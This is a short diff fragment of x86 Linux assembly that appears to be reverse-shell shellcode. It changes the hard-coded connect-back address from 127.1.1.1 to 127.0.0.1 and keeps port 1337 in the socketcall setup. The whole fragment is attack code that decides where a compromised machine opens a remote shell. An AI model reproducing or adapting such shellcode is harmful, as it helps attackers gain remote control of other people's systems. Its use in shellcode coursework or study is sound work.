@@ -23,7 +23,7 @@ _start:
     int    0x80
     xchg   edx,eax
     mov    al,0x66
-    push   0x101017f ; IP: 127.1.1.1
+    push   0x100007f ; IP: 127.0.0.1
     push strict word 0x3905 ; Port: 1337
     inc    ebx
     push   bx
